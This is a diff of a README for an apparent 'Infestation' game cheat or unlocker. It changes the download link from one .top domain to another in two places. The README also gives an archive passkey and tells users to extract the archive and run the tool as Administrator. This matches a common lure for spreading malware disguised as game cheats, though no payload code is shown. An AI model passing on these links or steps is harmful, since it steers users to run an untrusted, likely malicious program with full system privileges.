@@ -6,7 +6,7 @@ Infestation unlocker with weapon unlocker, skin unlocker, clothing unlocker, cla
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -73,7 +73,7 @@ Based on popular mods like **Infestation Cheat Engine**, **Infestation Hack**, a
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Infestation.
 4. Run the unlocker **as Administrator**.
